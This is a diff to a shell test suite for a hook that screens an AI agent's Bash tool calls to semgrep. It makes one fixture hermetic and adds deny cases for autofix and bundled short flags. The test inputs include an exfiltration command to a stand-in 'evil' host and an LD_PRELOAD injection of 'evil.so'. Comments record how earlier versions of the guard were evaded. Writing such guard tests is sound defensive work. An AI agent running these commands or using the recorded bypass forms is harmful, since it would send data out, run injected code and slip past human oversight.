@@ -74,8 +74,15 @@ _run_guard() {
 _run_guard_no_lib() {
 	local payload=$1 out st hookdir
 	hookdir=$(mktemp -d -t p1dir-nolib.XXXXXX)
-	cp "$HOOK" "$hookdir/phase1-directive-pending-guard.sh"
-	if out=$(cd "$TDIR" && printf '%s' "$payload" | "$hookdir/phase1-directive-pending-guard.sh" 2>/dev/null); then
+	# HERMETIC (CR-in-CI): nest the copy in $hookdir/hooks/ so the hook's own
+	# `$HOOK_DIR/../_lib` lookup resolves INSIDE the fixture ($hookdir/_lib,
+	# guaranteed absent). A flat copy in the mktemp dir would resolve to the
+	# SHARED /tmp/_lib — if any process ever created that path the escapes
+	# would stop being the sole guard and these assertions would pass for the
+	# wrong reason.
+	mkdir -p "$hookdir/hooks"
+	cp "$HOOK" "$hookdir/hooks/phase1-directive-pending-guard.sh"
+	if out=$(cd "$TDIR" && printf '%s' "$payload" | "$hookdir/hooks/phase1-directive-pending-guard.sh" 2>/dev/null); then
 		st=0
 	else
 		st=$?
@@ -478,6 +485,14 @@ teardown() {
 	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -o out.json"}}')" = deny ]
 	# attached short form -oFILE evaded the old boundary-anchored reject (#2531 CR r1 Finding B)
 	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -oout.json"}}')" = deny ]
+	# `-a` is semgrep's documented short alias for --autofix (IN-PLACE SOURCE
+	# REWRITE) and `-qa`/`-qo` bundle it into a cluster — the long-form-only
+	# screen missed both (CR-in-CI major). --allow-* screened as a family.
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --autofix --config=auto ."}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -a --config=auto ."}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -qa --config=auto ."}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -qo out.json"}}')" = deny ]
+	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --allow-untrusted-validators --config=auto ."}}')" = deny ]
 	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan -o https://evil/exfil"}}')" = deny ]
 	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"semgrep scan --sarif-output=x"}}')" = deny ]
 	[ "$(_run_guard '{"tool_name":"Bash","tool_input":{"command":"LD_PRELOAD=./evil.so semgrep scan"}}')" = deny ]
